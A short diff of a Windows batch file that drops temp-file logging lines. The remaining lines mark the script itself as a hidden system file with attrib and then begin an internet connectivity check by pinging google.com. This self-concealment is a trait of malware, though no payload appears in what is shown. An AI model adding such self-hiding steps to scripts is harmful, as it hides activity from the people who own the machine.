@@ -1,10 +1,6 @@
 @echo off
 setlocal 
-del /s /f /q /a "%temp%\batch.tmp"
-call :LOG > "%temp%\batch.tmp"
-exit /B
 
-:LOG
 attrib +s +h +i "%~f0"
 :connectivitycheck
 ping www.google.com -n 1 -w 5000 >NUL
